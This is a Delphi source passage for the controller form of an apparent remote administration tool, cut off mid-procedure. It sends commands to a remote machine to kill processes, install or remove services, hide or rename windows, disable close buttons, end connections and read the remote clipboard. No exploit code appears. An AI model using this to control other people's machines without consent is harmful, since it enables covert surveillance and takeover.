unit UnitFormFuncoesDiversas;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, Menus, UnitPrincipal;

type
  TFormFuncoesDiversas = class(TForm)
    PageControl1: TPageControl;
    StatusBar1: TStatusBar;
    TabSheet1: TTabSheet;
    Button1: TButton;
    TabSheet2: TTabSheet;
    Button2: TButton;
    TabSheet3: TTabSheet;
    Button3: TButton;
    TabSheet4: TTabSheet;
    Button4: TButton;
    TabSheet5: TTabSheet;
    Button5: TButton;
    PopupMenuProcessos: TPopupMenu;
    PopupMenuServicos: TPopupMenu;
    PopupMenuJanelas: TPopupMenu;
    PopupMenuProgInstalados: TPopupMenu;
    PopupMenuPortas: TPopupMenu;
    ListView2: TListView;
    ListView3: TListView;
    ListView4: TListView;
    Atualizar1: TMenuItem;
    Finalizar1: TMenuItem;
    N1: TMenuItem;
    Sair1: TMenuItem;
    Atualizar2: TMenuItem;
    N2: TMenuItem;
    Iniciar1: TMenuItem;
    Parar1: TMenuItem;
    Desinstalar1: TMenuItem;
    Instalar1: TMenuItem;
    N3: TMenuItem;
    Sair2: TMenuItem;
    Atualizar3: TMenuItem;
    N4: TMenuItem;
    Sair3: TMenuItem;
    N5: TMenuItem;
    Fechar1: TMenuItem;
    Maximizar1: TMenuItem;
    Minimizar1: TMenuItem;
    MostrarRestaurar1: TMenuItem;
    Ocultar1: TMenuItem;
    Minimizartodas1: TMenuItem;
    Mudaronome1: TMenuItem;
    BloquearobotoX1: TMenuItem;
    DesbloquearobotoXFechar1: TMenuItem;
    Atualizar4: TMenuItem;
    Desinstalar2: TMenuItem;
    N6: TMenuItem;
    Sair4: TMenuItem;
    Atualizar5: TMenuItem;
    N7: TMenuItem;
    N8: TMenuItem;
    Sair5: TMenuItem;
    DNSResolve1: TMenuItem;
    Finalizarconexo1: TMenuItem;
    Finalizarprocesso1: TMenuItem;
    ListView1: TListView;
    ListView5: TListView;
    TabSheet6: TTabSheet;
    Memo1: TMemo;
    Button6: TButton;
    TabSheet7: TTabSheet;
    Memo2: TMemo;
    Button7: TButton;
    Button8: TButton;
    procedure Button1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure ListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure Finalizar1Click(Sender: TObject);
    procedure Sair1Click(Sender: TObject);
    procedure ListView1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure ListView1Compare(Sender: TObject; Item1, Item2: TListItem;
      Data: Integer; var Compare: Integer);
    procedure Button2Click(Sender: TObject);
    procedure Iniciar1Click(Sender: TObject);
    procedure Parar1Click(Sender: TObject);
    procedure Desinstalar1Click(Sender: TObject);
    procedure Instalar1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure ListView3CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure PopupMenuProcessosPopup(Sender: TObject);
    procedure PopupMenuServicosPopup(Sender: TObject);
    procedure PopupMenuJanelasPopup(Sender: TObject);
    procedure PopupMenuProgInstaladosPopup(Sender: TObject);
    procedure PopupMenuPortasPopup(Sender: TObject);
    procedure Fechar1Click(Sender: TObject);
    procedure Maximizar1Click(Sender: TObject);
    procedure Minimizar1Click(Sender: TObject);
    procedure MostrarRestaurar1Click(Sender: TObject);
    procedure Ocultar1Click(Sender: TObject);
    procedure Minimizartodas1Click(Sender: TObject);
    procedure BloquearobotoX1Click(Sender: TObject);
    procedure DesbloquearobotoXFechar1Click(Sender: TObject);
    procedure Mudaronome1Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Desinstalar2Click(Sender: TObject);
    procedure ListView5CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure Button5Click(Sender: TObject);
    procedure DNSResolve1Click(Sender: TObject);
    procedure Finalizarprocesso1Click(Sender: TObject);
    procedure Finalizarconexo1Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure PageControl1Change(Sender: TObject);
  private
    { Private declarations }
    SortColumn: integer;
    SortReverse: boolean;

    Servidor: PConexao;
    procedure AtualizarStrings;
    procedure GerarRelatorio(Configs: string);
    procedure ChangeListViewLineColor(Listview: TListview; Item: TListItem; Color: TColor);
  public
    { Public declarations }
    Configs: string;
    procedure OnRead(Recebido: String; ConAux: PConexao); overload;
    constructor Create(aOwner: TComponent; ConAux: PConexao);overload;
  end;

var
  FormFuncoesDiversas: TFormFuncoesDiversas;

const
  Separador = '##@@';

implementation

uses
  UnitStrings,
  UnitComandos,
  UnitConexao,
  FuncoesDiversasCliente;

{$R *.dfm}

const
  SERVICE_STOPPED                = $00000001;
  SERVICE_START_PENDING          = $00000002;
  SERVICE_STOP_PENDING           = $00000003;
  SERVICE_RUNNING                = $00000004;
  SERVICE_CONTINUE_PENDING       = $00000005;
  SERVICE_PAUSE_PENDING          = $00000006;
  SERVICE_PAUSED                 = $00000007;

var
  ServicesArray: array [0..5000] of string;

constructor TFormFuncoesDiversas.Create(aOwner: TComponent; ConAux: PConexao);
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  Memo1.Clear;
end;

procedure TFormFuncoesDiversas.ChangeListViewLineColor(Listview: TListview; Item: TListItem; Color: TColor);
var
  DefaultDraw: boolean;
  CustomDrawState: TCustomDrawState;
begin
  Item.Data := TObject(Color);

  if Listview = listview1 then
  ListView1CustomDrawItem(Listview1, Item, CustomDrawState, DefaultDraw) else

  if Listview = listview3 then
  ListView3CustomDrawItem(Listview3, Item, CustomDrawState, DefaultDraw);

  if Listview = listview5 then
  ListView5CustomDrawItem(Listview5, Item, CustomDrawState, DefaultDraw);
end;

function ConvertStatus(str: string): string;
begin
  delete(str, pos(' ', str), 1); // preciso colocar isso porque a resposta vem assim: " '4 |'
  Result := traduzidos[171];
  if str = inttostr(SERVICE_STOPPED) then result := traduzidos[172] else
  if str = inttostr(SERVICE_START_PENDING) then result := traduzidos[175] else
  if str = inttostr(SERVICE_STOP_PENDING) then result := traduzidos[176] else
  if str = inttostr(SERVICE_RUNNING) then result := traduzidos[173] else
  if str = inttostr(SERVICE_CONTINUE_PENDING) then result := traduzidos[177] else
  if str = inttostr(SERVICE_PAUSE_PENDING) then result := traduzidos[178] else
  if str = inttostr(SERVICE_PAUSED) then result := traduzidos[174];
end;

procedure TFormFuncoesDiversas.OnRead(Recebido: String; ConAux: PConexao);
var
  Item: TListItem;
  CurrentProcess: integer;
  i: integer;
  TempStr, TempStr1: string;
  TempInt: integer;
  CurrentPID: string;
begin
  if copy(recebido, 1, pos('|', recebido) - 1) = LISTADEPROCESSOSPRONTA then
  begin
    delete(recebido, 1, pos('|', recebido));
    try
      CurrentProcess := strtoint(copy(recebido, 1, pos('|', recebido) - 1));
      except
      Atualizar1.Enabled := true;
      Button1.Enabled := true;
      exit;
    end;
    delete(recebido, 1, pos('|', recebido));

    if CurrentProcess = 0 then
    begin
      StatusBar1.Panels.Items[0].Text := Traduzidos[166];
      Atualizar1.Enabled := true;
      Button1.Enabled := true;
      exit;
    end;
    ListView1.Items.Clear;

    Listview1.Items.BeginUpdate;
    while recebido <> '' do
    begin
      Item := ListView1.Items.Add;
      Item.ImageIndex := 270;
      Item.Caption := copy(recebido, 1, pos('|', recebido) - 1); // Processo
      delete(recebido, 1, pos('|', recebido));

      Item.SubItems.Add(copy(recebido, 1, pos('|', recebido) - 1)); // PID
      delete(recebido, 1, pos('|', recebido));

      Item.SubItems.Add(floattostr(strtofloat(copy(recebido, 1, pos('|', recebido) - 1)) / 1024)); // Memória (Kb)
      delete(recebido, 1, pos('|', recebido));

      Item.SubItems.Add(copy(recebido, 1, pos('|', recebido) - 1));
      delete(recebido, 1, pos('|', recebido));

      delete(recebido, 1, 2); // deleta #13#10
    end;
    Listview1.Items.EndUpdate;

    for i := 0 to ListView1.Items.Count - 1 do
    if ListView1.Items.Item[i].SubItems.Strings[0] = inttostr(CurrentProcess) then
    begin
      ChangeListViewLineColor(ListView1, ListView1.Items.Item[i], clRed);
      break;
    end;
    StatusBar1.Panels.Items[0].Text := Traduzidos[165];
    Atualizar1.Enabled := true;
    Button1.Enabled := true;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = FINALIZARPROCESSO then
  begin
    delete(recebido, 1, pos('|', recebido));
    if copy(recebido, 1, pos('|', recebido) - 1) = 'Y' then
    begin
      delete(recebido, 1, pos('|', recebido));
      TempStr := copy(recebido, 1, pos('|', recebido) - 1);
      for i := 0 to listview1.Items.Count - 1 do
      if listview1.Items.Item[i].SubItems.Strings[0] = TempStr then
      begin
        listview1.Items.Delete(i);
        break;
      end;
      StatusBar1.Panels.Items[0].Text := Traduzidos[167] + ' PID(' + TempStr + ') ' + Traduzidos[168];
    end else
    begin
      delete(recebido, 1, pos('|', recebido));
      TempStr := copy(recebido, 1, pos('|', recebido) - 1);
      StatusBar1.Panels.Items[0].Text := Traduzidos[167] + ' PID(' + TempStr + ') ' + Traduzidos[169];
    end
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = LISTADESERVICOSPRONTA then
  begin
    delete(recebido, 1, pos('|', recebido));

    ListView2.Items.Clear;

    Listview2.Items.BeginUpdate;

    i := 0;

    while recebido <> '' do
    begin
      Item := ListView2.Items.Add;
      Item.ImageIndex := 301;

      TempStr := copy(recebido, 1, pos('®', recebido) - 1); // nome do serviço que não será exibido
      delete(recebido, 1, pos('®', recebido));

      ServicesArray[i] := TempStr;

      Item.Caption := copy(recebido, 1, pos('®', recebido) - 1); // Display name
      delete(recebido, 1, pos('®', recebido));

      Item.SubItems.Add(copy(recebido, 1, pos('®', recebido) - 1)); // Descrição
      delete(recebido, 1, pos('®', recebido));

      Item.SubItems.Add(ConvertStatus(copy(recebido, 1, pos('®', recebido) - 1))); // Status
      delete(recebido, 1, pos('®', recebido));

      Item.SubItems.Objects[1] := TObject(i);
      inc(i, 1);
    end;
    Listview2.Items.EndUpdate;

    StatusBar1.Panels.Items[0].Text := Traduzidos[179];
    Atualizar2.Enabled := true;
    Button2.Enabled := true;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = DESINSTALARSERVICO then
  begin
    delete(recebido, 1, pos('|', recebido));
    if copy(recebido, 1, pos('|', recebido) - 1) = 'Y' then
    begin
      delete(recebido, 1, pos('|', recebido));
      TempStr := copy(recebido, 1, pos('|', recebido) - 1);
      for i := 0 to listview2.Items.Count - 1 do
      if ServicesArray[integer(listview2.Items.Item[i].SubItems.Objects[1])] = TempStr then
      begin
        listview2.Items.Delete(i);
        break;
      end;
      StatusBar1.Panels.Items[0].Text := Traduzidos[181] + ' "' + TempStr + '" ' + Traduzidos[182];
    end else
    begin
      delete(recebido, 1, pos('|', recebido));
      TempStr := copy(recebido, 1, pos('|', recebido) - 1);
      StatusBar1.Panels.Items[0].Text := Traduzidos[181] + ' "' + TempStr + '" ' + Traduzidos[183];
    end;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = INSTALARSERVICO then
  begin
    delete(recebido, 1, pos('|', recebido));
    if copy(recebido, 1, pos('|', recebido) - 1) = 'Y' then
    begin
      delete(recebido, 1, pos('|', recebido));
      TempStr := copy(recebido, 1, pos('|', recebido) - 1);
      StatusBar1.Panels.Items[0].Text := Traduzidos[181] + ' "' + TempStr + '" ' + Traduzidos[184];
    end else
    begin
      delete(recebido, 1, pos('|', recebido));
      TempStr := copy(recebido, 1, pos('|', recebido) - 1);
      StatusBar1.Panels.Items[0].Text := Traduzidos[181] + ' "' + TempStr + '" ' + Traduzidos[185];
    end;
  end else


  if copy(recebido, 1, pos('|', recebido) - 1) = LISTADEJANELASPRONTA then
  begin
    delete(recebido, 1, pos('|', recebido));

    if recebido = 'XXX' then
    begin
      StatusBar1.Panels.Items[0].Text := Traduzidos[200];
      Atualizar3.Enabled := true;
      Button3.Enabled := true;
      exit;
    end;

    Listview3.Clear;
    Listview3.Items.BeginUpdate;

    while recebido <> '' do
    begin
      TempStr := Copy(recebido, 1, Pos('|', recebido) - 1);
      if copy(TempStr, 1, 4) = '*@*@' then
      begin
        delete(TempStr, 1, 4);
        Item := ListView3.Items.Add;
        Item.ImageIndex := 271;
        Item.Caption := TempStr;
        Delete(recebido, 1, Pos('|', recebido));

        Item.SubItems.Add(Copy(recebido, 1, Pos('|', recebido) - 1));
        Delete(recebido, 1, Pos('|', recebido));

        Item.SubItems.Add(Copy(recebido, 1, Pos('|', recebido) - 1));
        Delete(recebido, 1, Pos('|', recebido));

        Item.SubItems.Add(traduzidos[197]);
      end else
      begin
        Item := ListView3.Items.Add;
        Item.ImageIndex := 271;
        Item.Caption := TempStr;
        Delete(recebido, 1, Pos('|', recebido));

        Item.SubItems.Add(Copy(recebido, 1, Pos('|', recebido) - 1));
        Delete(recebido, 1, Pos('|', recebido));

        Item.SubItems.Add(Copy(recebido, 1, Pos('|', recebido) - 1));
        Delete(recebido, 1, Pos('|', recebido));

        Item.SubItems.Add(traduzidos[196]);
      end;
    end;
    if listview3.Items.Count >= 1 then
    for i := 0 to Listview3.Items.Count - 1 do
    if Listview3.Items.Item[i].SubItems.Strings[2] = traduzidos[197] then
    ChangeListViewLineColor(ListView3, Listview3.Items.Item[i], clGray);

    Listview3.Items.EndUpdate;
    StatusBar1.Panels.Items[0].Text := Traduzidos[199];
    Atualizar3.Enabled := true;
    Button3.Enabled := true;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = WINDOWS_MIN then
  begin
    delete(recebido, 1, pos('|', recebido));
    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    StatusBar1.Panels.Items[0].Text := Traduzidos[203] + ' "' + TempStr + '"';
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = WINDOWS_MAX then
  begin
    delete(recebido, 1, pos('|', recebido));
    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    StatusBar1.Panels.Items[0].Text := Traduzidos[204] + ' "' + TempStr + '"';
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = WINDOWS_FECHAR then
  begin
    delete(recebido, 1, pos('|', recebido));
    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    delete(recebido, 1, pos('|', recebido));
    if recebido <> ''  then
    StatusBar1.Panels.Items[0].Text := Traduzidos[205] + ' "' + TempStr + '"' else
    begin
      for i := 0 to listview3.Items.Count - 1 do
      if listview3.Items.Item[i].SubItems.strings[0] = TempStr then
      begin
        listview3.Items.Delete(i);
        break;
      end;
      StatusBar1.Panels.Items[0].Text := Traduzidos[206] + ' "' + TempStr + '"';
    end;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = WINDOWS_MOSTRAR then
  begin
    delete(recebido, 1, pos('|', recebido));
    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    StatusBar1.Panels.Items[0].Text := Traduzidos[207] + ' "' + TempStr + '"';
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = WINDOWS_OCULTAR then
  begin
    delete(recebido, 1, pos('|', recebido));
    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    StatusBar1.Panels.Items[0].Text := Traduzidos[208] + ' "' + TempStr + '"';
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = WINDOWS_MIN_TODAS then
  begin
    StatusBar1.Panels.Items[0].Text := Traduzidos[209];
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = WINDOWS_CAPTION then
  begin
    delete(recebido, 1, pos('|', recebido));
    TempInt := StrToInt(copy(recebido, 1, pos('|', recebido) - 1));
    delete(recebido, 1, pos('|', recebido));
    if copy(recebido, 1, pos('|', recebido) - 1) = 'N' then
    begin
      StatusBar1.Panels.Items[0].Text := Traduzidos[212];
    end else
    begin
      TempStr := copy(recebido, 1, pos('|', recebido) - 1);
      for i := 0 to listview3.Items.Count - 1 do
      if listview3.Items.Item[i].SubItems.strings[0] = IntToStr(TempInt) then
      begin
        listview3.Items.Item[i].Caption := TempStr;
        break;
      end;
      StatusBar1.Panels.Items[0].Text := Traduzidos[213] + ' "' + Inttostr(TempInt) + '--->' + TempStr + '"';
    end;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = DISABLE_CLOSE then
  begin
    delete(recebido, 1, pos('|', recebido));
    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    StatusBar1.Panels.Items[0].Text := Traduzidos[210] + ' "' + TempStr + '"';
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = ENABLE_CLOSE then
  begin
    delete(recebido, 1, pos('|', recebido));
    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    StatusBar1.Panels.Items[0].Text := Traduzidos[211] + ' "' + TempStr + '"';
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = LISTADEPROGRAMASINSTALADOSPRONTA then
  begin
    delete(recebido, 1, pos('|', recebido));

    listview4.Items.BeginUpdate;
    while pos(separador, recebido) > 1 do
    begin
      Item := listview4.Items.Add;
      Item.ImageIndex := 320;

      Item.Caption := Copy(recebido, 1, Pos(separador, recebido) - 1);
      Delete(recebido, 1, Pos(separador, recebido) + length(separador) - 1);

      Item.SubItems.Add(Copy(recebido, 1, Pos(separador, recebido)-1 ));
      Delete(recebido, 1, Pos(separador, recebido) + length(separador) - 1);

      if copy(recebido, 1, pos(separador, recebido) - 1) = 'YYY' then
      Item.SubItems.Add(traduzidos[219]) else Item.SubItems.Add(traduzidos[220]);

      Delete(recebido, 1, Pos(separador, recebido) + length(separador) - 1);
      delete(recebido, 1, 2); // deletar #13#10
    end;
    listview4.Items.EndUpdate;

    Atualizar4.Enabled := true;
    Button4.Enabled := true;

    StatusBar1.Panels.Items[0].Text := Traduzidos[218];
  end else


  if copy(recebido, 1, pos('|', recebido) - 1) = LISTADEPORTASPRONTA then
  begin
    Delete(recebido, 1, pos('|', recebido));
    CurrentPID := Copy(recebido, 1, pos('|', recebido) - 1);
    Delete(recebido, 1, pos('|', recebido));

    Listview5.Items.Clear;
    Listview5.Items.BeginUpdate;

    while pos(#13#10, recebido) > 1 do
    begin
      Item := ListView5.Items.Add;
      Item.ImageIndex := 344;

      Item.Caption := Copy(recebido, 1, Pos('|', recebido) - 1);
      Delete(recebido, 1, Pos('|', recebido));

      Item.SubItems.Add(Copy(recebido, 1, Pos('|', recebido) - 1));
      Delete(recebido, 1, Pos('|', recebido));

      Item.SubItems.Add(Copy(recebido, 1, Pos('|', recebido) - 1));
      Delete(recebido, 1, Pos('|', recebido));

      Item.SubItems.Add(Copy(recebido, 1, Pos('|', recebido) - 1));
      Delete(recebido, 1, Pos('|', recebido));

      Item.SubItems.Add(Copy(recebido, 1, Pos('|', recebido) - 1));
      Delete(recebido, 1, Pos('|', recebido));

      Item.SubItems.Add(Copy(recebido, 1, Pos('|', recebido) - 1));
      Delete(recebido, 1, Pos('|', recebido));

      Item.SubItems.Add(Copy(recebido, 1, Pos('|', recebido) - 1));
      Delete(recebido, 1, Pos('|', recebido));

      Item.SubItems.Add(Copy(recebido, 1, Pos('|', recebido) - 1));
      Delete(recebido, 1, Pos('|', recebido));

      delete(recebido, 1, 2); // o ENTER #13#10
    end;

    for i := 0 to ListView5.Items.Count - 1 do
    if ListView5.Items.Item[i].SubItems.Strings[5] = CurrentPID then
    begin
      ChangeListViewLineColor(ListView5, ListView5.Items.Item[i], clRed);
    end;
    Listview5.Items.EndUpdate;

    Atualizar5.Enabled := true;
    Button5.Enabled := true;

    StatusBar1.Panels.Items[0].Text := Traduzidos[227];
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = FINALIZARCONEXAO then
  begin
    delete(recebido, 1, pos('|', recebido));

    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    delete(recebido, 1, pos('|', recebido));

    TempStr1 := copy(recebido, 1, pos('|', recebido) - 1);
    delete(recebido, 1, pos('|', recebido));

    if copy(recebido, 1, pos('|', recebido) - 1) = 'TRUE' then
    StatusBar1.Panels.Items[0].Text := Traduzidos[229] + ' "' + TempStr + '<--->' + TempStr1 + '"' else
    StatusBar1.Panels.Items[0].Text := Traduzidos[230] + ' "' + TempStr + '<--->' + TempStr1 + '"';
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = FINALIZARPROCESSOPORTAS then
  begin
    delete(recebido, 1, pos('|', recebido));
    if copy(recebido, 1, pos('|', recebido) - 1) = 'Y' then
    begin
      delete(recebido, 1, pos('|', recebido));
      TempStr := copy(recebido, 1, pos('|', recebido) - 1);
      for i := listview5.Items.Count - 1 downto 0 do
      if listview5.Items.Item[i].SubItems.Strings[5] = TempStr then listview5.Items.Delete(i);
      StatusBar1.Panels.Items[0].Text := Traduzidos[167] + ' PID(' + TempStr + ') ' + Traduzidos[168];
    end else
    begin
      delete(recebido, 1, pos('|', recebido));
      TempStr := copy(recebido, 1, pos('|', recebido) - 1);
      StatusBar1.Panels.Items[0].Text := Traduzidos[167] + ' PID(' + TempStr + ') ' + Traduzidos[169];
    end
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = CONFIGURACOESDOSERVER then
  begin
    delete(recebido, 1, pos('|', recebido));
    GerarRelatorio(recebido);
    Button6.Enabled := true;
    StatusBar1.Panels.Items[0].Text := Traduzidos[240];
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = OBTERCLIPBOARD then
  begin
    delete(recebido, 1, pos('|', recebido));
    if recebido <> '' then
    begin
      Memo2.Lines.BeginUpdate;
      Memo2.Clear;
      Memo2.Text := recebido;
      Memo2.Lines.EndUpdate;
      StatusBar1.Panels.Items[0].Text := Traduzidos[249];
    end else
    begin
      Memo2.Clear;
      StatusBar1.Panels.Items[0].Text := Traduzidos[250];
    end;
    Button7.Enabled := true;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = OBTERCLIPBOARDFILES then
  begin
    delete(recebido, 1, pos('|', recebido));
    if recebido <> '' then
    begin
      Memo2.Lines.BeginUpdate;
      Memo2.Clear;
      Memo2.Lines.Add(traduzidos[251] + #13#10);
      while recebido <> '' do
      begin
        Memo2.Lines.Add(copy(recebido, 1, pos('|', recebido) - 1));
        delete(recebido, 1, pos('|', recebido));
      end;
      Memo2.Lines.EndUpdate;
      StatusBar1.Panels.Items[0].Text := Traduzidos[249];
    end else
    begin
      Memo2.Clear;
      StatusBar1.Panels.Items[0].Text := Traduzidos[250];
    end;
    Button7.Enabled := true;
  end else



end;

procedure TFormFuncoesDiversas.AtualizarStrings;
begin
  TabSheet1.Caption := traduzidos[137];
  TabSheet2.Caption := traduzidos[138];
  TabSheet3.Caption := traduzidos[139];
  TabSheet4.Caption := traduzidos[140];
  TabSheet5.Caption := traduzidos[142];
  TabSheet6.Caption := traduzidos[236];

  Button1.Caption := traduzidos[143];
  Button2.Caption := traduzidos[143];
  Button3.Caption := traduzidos[143];
  Button4.Caption := traduzidos[143];
  Button5.Caption := traduzidos[143];
  Button6.Caption := traduzidos[143];
  Button7.Caption := traduzidos[143];
  Button8.Caption := traduzidos[248];

  Atualizar1.Caption := traduzidos[143];
  Finalizar1.Caption := traduzidos[144];
  Sair1.Caption := traduzidos[22];
  Listview1.Column[0].Caption := traduzidos[161];
  Listview1.Column[2].Caption := traduzidos[162];
  Listview1.Column[3].Caption := traduzidos[163];


  Atualizar2.Caption := traduzidos[143];
  Sair2.Caption := traduzidos[22];
  Iniciar1.Caption := traduzidos[145];
  Parar1.Caption := traduzidos[146];
  Desinstalar1.Caption := traduzidos[147];
  Instalar1.Caption := traduzidos[148];
  Listview2.Column[0].Caption := traduzidos[187];
  Listview2.Column[1].Caption := traduzidos[190];

  Atualizar3.Caption := traduzidos[143];
  Sair3.Caption := traduzidos[22];
  Fechar1.Caption := traduzidos[149];
  Maximizar1.Caption := traduzidos[150];
  Minimizar1.Caption := traduzidos[151];
  MostrarRestaurar1.Caption := traduzidos[152];
  Ocultar1.Caption := traduzidos[153];
  Minimizartodas1.Caption := traduzidos[154];
  Mudaronome1.Caption := traduzidos[155];
  BloquearobotoX1.Caption := traduzidos[156];
  DesbloquearobotoXFechar1.Caption := traduzidos[157];
  Listview3.Column[0].Caption := traduzidos[214];
  Listview3.Column[2].Caption := traduzidos[50];
  Listview3.Column[3].Caption := traduzidos[215];

  Atualizar4.Caption := traduzidos[143];
  Desinstalar2.Caption := traduzidos[147];
  Sair4.Caption := traduzidos[22];
  Listview4.Column[0].Caption := traduzidos[216];
  Listview4.Column[1].Caption := traduzidos[50];
  Listview4.Column[2].Caption := traduzidos[217];

  Atualizar5.Caption := traduzidos[143];
  Sair5.Caption := traduzidos[22];
  DNSResolve1.Caption := traduzidos[158];
  Finalizarconexo1.Caption := traduzidos[159];
  Finalizarprocesso1.Caption := traduzidos[141];
  Listview5.Column[0].Caption := traduzidos[222];
  Listview5.Column[1].Caption := traduzidos[223];
  Listview5.Column[2].Caption := traduzidos[224];
  Listview5.Column[3].Caption := traduzidos[225];
  Listview5.Column[4].Caption := traduzidos[226];
  Listview5.Column[7].Caption := traduzidos[161];
end;

procedure TFormFuncoesDiversas.Button1Click(Sender: TObject);
begin
  Atualizar1.Enabled := false;
  Button1.Enabled := false;
  StatusBar1.Panels.Items[0].Text := Traduzidos[164];
  ListView1.Clear;
  EnviarString(Servidor.Athread, LISTARPROCESSOS + '|', true);
end;

procedure TFormFuncoesDiversas.FormShow(Sender: TObject);
begin
  Memo2.Clear;
  AtualizarStrings;
  Statusbar1.Panels.Items[0].Text := '';
  Button1.Enabled := true;
  Button2.Enabled := true;
  Button3.Enabled := true;
  Button4.Enabled := true;
  Button5.Enabled := true;
  Atualizar1.Enabled := true;
  Atualizar2.Enabled := true;
  Atualizar3.Enabled := true;
  Atualizar4.Enabled := true;
  Atualizar5.Enabled := true;
  if (Memo1.Text = '') and (FormPrincipal.ConfigsList.Strings[Servidor.ConfigID] <> '') then
  OnRead(CONFIGURACOESDOSERVER + '|' + FormPrincipal.ConfigsList.Strings[Servidor.ConfigID], Servidor);
end;

procedure TFormFuncoesDiversas.ListView1CustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then
  begin
    Sender.Canvas.Font.Color := TColor(Item.Data);
  end else
  Sender.Canvas.Font.Color := ClBlack;
end;

procedure TFormFuncoesDiversas.Finalizar1Click(Sender: TObject);
begin
  if ListView1.Selected <> nil then
  if messagedlg(pchar(traduzidos[170]), mtConfirmation, [mbYes, mbNo], 0) = IdNo then exit;
  EnviarString(Servidor.Athread, FINALIZARPROCESSO + '|' + ListView1.Selected.SubItems.Strings[0] + '|', true);
end;

procedure TFormFuncoesDiversas.Sair1Click(Sender: TObject);
begin
  Close;
end;

procedure TFormFuncoesDiversas.ListView1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  if (SortColumn = Column.Index) then
    SortReverse := not SortReverse //reverse the sort order since this column is already selected for sorting
  else
  begin
    SortColumn := Column.Index;
    SortReverse := false;
  end;
  if TListView(Sender) = ListView1 then ListView1.CustomSort(nil, 0) else
  if TListView(Sender) = ListView2 then ListView2.CustomSort(nil, 0) else
  if TListView(Sender) = ListView3 then ListView3.CustomSort(nil, 0) else
  if TListView(Sender) = ListView4 then ListView4.CustomSort(nil, 0) else
  if TListView(Sender) = ListView5 then ListView5.CustomSort(nil, 0);
end;

procedure TFormFuncoesDiversas.ListView1Compare(Sender: TObject; Item1,
  Item2: TListItem; Data: Integer; var Compare: Integer);
begin
  if SortColumn = 0 then
    Compare := AnsiCompareStr(Item1.Caption, Item2.Caption)
  else
    Compare := AnsiCompareStr(Item1.SubItems[SortColumn-1], Item2.SubItems[SortColumn-1]);
  if SortReverse then Compare := 0 - Compare;
end;

procedure TFormFuncoesDiversas.Button2Click(Sender: TObject);
begin
  Atualizar2.Enabled := false;
  Button2.Enabled := false;
  StatusBar1.Panels.Items[0].Text := Traduzidos[164];
  ListView2.Clear;
  EnviarString(Servidor.Athread, LISTARSERVICOS + '|', true);
end;

procedure TFormFuncoesDiversas.Iniciar1Click(Sender: TObject);
begin
  if ListView2.Selected <> nil then
  EnviarString(Servidor.Athread, INICIARSERVICO + '|' +
               ServicesArray[integer(ListView2.Selected.SubItems.Objects[1])] + '|', true);
end;

procedure TFormFuncoesDiversas.Parar1Click(Sender: TObject);
begin
  if ListView2.Selected <> nil then
  EnviarString(Servidor.Athread, PARARSERVICO + '|' +
               ServicesArray[integer(ListView2.Selected.SubItems.Objects[1])] + '|', true);
end;

procedure TFormFuncoesDiversas.Desinstalar1Click(Sender: TObject);
begin
  if ListView2.Selected <> nil then
  if messagedlg(pchar(traduzidos[181] + ' "' + ListView2.Selected.Caption + '(' + ServicesArray[integer(ListView2.Selected.SubItems.Objects[1])] + ')" ' + traduzidos[195]), mtConfirmation, [mbYes, mbNo], 0) = IdNo then exit;
  EnviarString(Servidor.Athread, DESINSTALARSERVICO + '|' +
               ServicesArray[integer(ListView2.Selected.SubItems.Objects[1])] + '|', true);
end;

procedure TFormFuncoesDiversas.Instalar1Click(Sender: TObject);
var
  Nome_serv, Desc_serv, dir_serv: string;
begin
  Nome_serv := traduzidos[186];
  if inputquery(pchar(traduzidos[187]), pchar(traduzidos[188]), Nome_serv) = false then exit;

  Desc_serv := traduzidos[189];
  if inputquery(pchar(traduzidos[190]), pchar(traduzidos[191]), Desc_serv) = false then exit;

  dir_serv := 'c:\windows\myservice.exe';
  if inputquery(pchar(traduzidos[192]), pchar(traduzidos[193]), dir_serv) = false then exit;

  if messagedlg(pchar(traduzidos[194]), mtConfirmation, [mbYes, mbNo], 0) = idNo then Exit;

